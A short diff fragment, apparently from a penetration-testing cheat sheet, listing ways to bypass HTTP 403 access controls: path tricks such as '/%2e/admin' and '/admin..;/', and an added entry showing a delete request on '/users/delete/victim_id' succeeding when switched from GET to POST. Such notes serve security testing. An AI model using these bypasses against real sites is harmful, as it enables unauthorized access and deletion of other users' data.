@@ -53,3 +53,14 @@ site.com//;//secret –> HTTP 200 OK
 · /%2e/admin -> 200
 · /admin..;/ -> 200
 
+
+[ ] change HTTP method
+```bash
+GET /users/delete/victim_id  ->403
+POST /users/delete/victim_id ->200
+
+
+
+
+
+
